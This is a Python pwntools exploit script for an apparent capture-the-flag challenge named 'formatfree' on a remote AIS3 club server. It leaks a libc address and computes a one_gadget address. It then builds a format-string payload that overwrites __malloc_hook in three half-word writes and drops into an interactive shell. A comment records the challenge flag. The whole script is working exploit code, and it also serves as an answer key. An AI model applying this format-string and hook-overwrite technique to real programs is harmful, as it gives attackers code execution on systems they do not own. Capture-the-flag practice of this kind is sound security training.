#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'

#r = process('./formatfree', env={'LD_PRELOAD': './libc-2.29.so'})
r = remote('club.ais3.org', 5002)
libc = ELF('./libc-2.29.so')

r.recvuntil('name : ')
r.sendline('a')


r.recvuntil('you ')
libc_base = int(r.recvuntil('\n')[:-1],16) - 0x52fd0
print 'libc_base : ', hex(libc_base)

one_gadget = libc_base + 0x106ef8
print hex(one_gadget)

free_hook = libc_base + libc.symbols['__malloc_hook'];
print hex(free_hook)

a = one_gadget & 0xffff
b = (one_gadget >> 16) & 0xffff
c = (one_gadget >> 32) & 0xffff

print hex(a) , hex(b) , hex(c)

x = c
x1 = (b - c) & 0xffff
x2 = ((a - b) % 0xffff) & 0xffff

payload = '%{}c%24$hn%{}c%25$hn%{}c%26$hn%100000c'.format(x, x1, x2 + 1)
payload = payload.ljust(80, 'a')
payload += p64(free_hook + 4)
payload += p64(free_hook + 2)
payload += p64(free_hook)

raw_input('#')
r.sendline(payload)

# AIS3Club{fr33_0f_f0rm4t_and_free_7o_fr33}
r.interactive()
